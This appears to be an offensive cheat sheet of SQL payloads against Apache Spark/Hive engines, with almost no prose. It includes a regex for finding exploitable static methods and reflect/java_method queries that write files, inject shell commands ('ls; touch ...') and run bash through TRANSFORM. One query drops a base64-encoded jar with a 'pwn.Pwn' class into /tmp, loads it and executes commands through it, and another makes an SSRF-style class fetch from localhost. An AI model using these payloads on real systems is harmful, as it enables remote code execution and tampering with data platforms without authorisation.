regexes
=======
reset; grep -hrP 'public\s+static\s+.*\([^)]*\bString(?!\s*\[)' . | grep command


File Write
==========
SELECT reflect('org.antlr.v4.runtime.misc.Utils', 'writeFile', '/tmp/urmum3', 'i <3 2 hack');


RCE Queries
==========
SELECT java_method('org.apache.spark.util.Utils', 'checkCommandAvailable', 'ls; touch /tmp/urmum666');
SELECT java_method('org.apache.spark.TestUtils', 'testCommandAvailable', 'ls; touch /tmp/urmum');
SELECT transform(*) using 'bash' from values('ls /tmp/');
SELECT reflect('org.apache.logging.log4j.core.util.Loader', 'loadSystemClass', 'ExecOnLoad');


Load Custom jar
===============
SELECT reflect('java.nio.file.Files','write',reflect('java.nio.file.Paths','get','/tmp/pwn_25866.jar'),unbase64('UEsDBBQAAAAIADdhCVueivF8NwAAADUAAAAUAAAATUVUQS1JTkYvTUFOSUZFU1QuTUbzTczLTEstLtENSy0qzszPs1Iw1DPg5XIuSk0sSU3Rdaq0UgioLMnIz1OIyixIy8xJ5eXi5QIAUEsDBBQAAAAIADdhCVucE0HelwMAAPQFAAANAAAAcHduL1B3bi5jbGFzc31US3PTVhT+bqxYihAhUZyQlEfCK/iBLZqWPgiPQprQUCe4cWrqpLTI0k0QtSVXlnHYsu6+05kOsGgna7pwMmXKsgt+DL8gUzhXdh6eetDiSvec73z3Ow/d1//9/QrAVayp6EFEhqShF1GGgYfmI9Mom+66caf0kFsBQ/SK4zrBNYZIPFFQoDDIXi3jmhWuQsUhGZqGw+jviM0/rgW8wnBonQc536tyP3jMMBnPHoAEvuOuTyf+b1IxgEEZuoYhxDppQwDRBl7Wa3B/xqxxhli8C4mCEVLccFzBNqphDB8wKJbnBqbj1hiOHdQy88D08/znOnctPp1YUXEcJ2Sc1DCOCYbBfeBS3Q2cCp2pUmJ7m+EOAW0zKThNpbIqdoZvcAVnGXoMS1BPajiPOINEdoshHl99f1mogBav1YgwSYRGyXGN2gMFF4gwbcnIMIyEYMczbtbX1rjP7SVu2tyXcZFhbNc371brAdFzs9Jyq5jCRzI+1nAJn3Sk2T6RoZ/SPBDHcHQ31U5C6pmBz8QMfc4wGu8KSRRUpDEtQFcYhvZBLTVt/zUN10XXFYqxs47L+2jIbmi4iRnqp1engRzei8xRrfYVzGJOxi0NX2Ge+LtgqHpVsSu7omddil4QJflaQ1bUQ+Q+6/ue3woWOhY13Al1cD+s3jcalpAn2obpBHOeH/4j8zK+3T0/ZJ/dsHg1cDwaxWXc1fCd+NGOVFu6TOunZd+0aEBWqAWrqXsTFc+ul/lE2aOq2Cq+xz0ZP4iRmRf6G66Ra5B+acazafSOiBIt1isl7i+bpTJZDoecC2a1vZcqNPA0Il2nrECTnPfqvsXnHAFWiDsjYDhFB/dAPBEwcTfQ+iPtTtCb0bs3uQX2gj4Y7tMaDY1R9AmdLSi7RGG9ZP1Tl7fR1yStKX24iaO/YXwbx6L/YKAY0U/li5J+Jl/sTeabOLewieP7voTwpfZ8L5EuvoRRvNDEh1v4dAuXF9NNXC1elv5F/1/4Ykxq4svNt28O4G53wS3s4sifu7sJJZtqovAiTOB3PKMe9YQpzWGQVpVS0qCjHxna38IwchjBCkZh053i0e+8QTV5gpP4hW6LX3GaOM4Ryxk8x1n8gUmYxJKEsoOMjIEdjMqY2oEuI72DGFn02FvIYPQllmWJzivBalf7BmkRumKUnl4k2clXT9GXjExtY1UUv6VUh0RrAnRB0E2comszHZ5KnRuicDsE8ndQSwECFAMUAAAACAA3YQlbnorxfDcAAAA1AAAAFAAAAAAAAAAAAAAAgAEAAAAATUVUQS1JTkYvTUFOSUZFU1QuTUZQSwECFAMUAAAACAA3YQlbnBNB3pcDAAD0BQAADQAAAAAAAAAAAAAAgAFpAAAAcHduL1B3bi5jbGFzc1BLBQYAAAAAAgACAH0AAAArBAAAAAA='));
ADD JAR '/tmp/pwn_25866.jar';
SELECT java_method('pwn.Pwn', 'exec', '/bin/rm /tmp/pwn_25866.jar');


SSRF
====
SELECT reflect('javassist.URLClassPath', 'fetchClass', '127.0.0.1', 80, '/', 'ExecOnLoad');



